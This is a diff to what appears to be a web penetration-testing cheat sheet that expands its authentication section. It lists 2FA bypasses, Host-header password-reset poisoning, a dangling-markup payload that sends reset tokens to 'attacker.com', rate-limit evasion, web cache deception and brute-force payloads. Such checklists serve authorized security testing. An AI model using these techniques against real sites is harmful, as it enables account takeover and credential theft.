@@ -553,14 +553,48 @@ xp_cmdshell 'COMMAND';
 ### <ins>Authentication vulnerabilities</ins>
 
 - Multi-factor authentication
-  - Try to intercept the response and modify the status to `200`;
-  - Bruteforce.
+  - Response manipulation, try to intercept the response and modify the status to `200`
+  - Status code manipulation, change the code from `4xx` to `200`
+  - 2FA code leakage in the response
+  - JS File Analysis
+  - 2FA Code Reusability
+  - Lack of Bruteforce protection
+  - The 2FA code can be used for any user
+  - CSRF on 2FA disabling
+  - Password reset disable 2FA
+  - Bypass 2FA with null or `000000`
+  - Access the content directly
+  - Login with Oauth to bypass 2FA
+  - If you get logged-out after failed attempts, use macros with Burp
 - Password reset
-  - Change the `Host` with the host of your server. The request for a password reset might use the `Host` value for the link with the reset token;
-  - Try with headers like `X-Forwarded-Host:`.
+  - Change the `Host` with the host of your server. The request for a password reset might use the `Host` value for the link with the reset token
+  - Try with headers like `X-Forwarded-Host:`
+  - Via dangling markup
+    - `Host: victim.com:'<a href="//attacker.com/?`
+  - Insert two emails, like:
+    - `email1@service.com;email2@service.com`
+    - `email:["email1@service.com","email2@service.com"]`
 - [Password change](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change)
 - [Keeping users logged in](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)
-
+- Rate-limit
+  - Bypass with `X-Forwarded-For:127.0.0.1-1000`
+  - IP rotating
+  - Log in into a valid account to reset the rate-limit
+- Test remember me functionality
+- Web Cache Deception
+  - Attacker send to a victim a 404 endpoint like `site.com/dir/ok.css`
+  - Victim click on it, the CDN cache the page
+  - Attacker goes to `site.com/dir/ok.css`, now it can see the page of the Victim
+- PHP protections can be bypassed with `[]`, like `password=123` to `password[]=123`
+- Replace password with a list of candidates, example
+  ```
+  "username":"usertest"
+  "password":[
+   "123456",
+   "password",
+   "qwerty",
+   ...
+  ``` 
 
 
 ### <ins>Directory Traversal</ins>
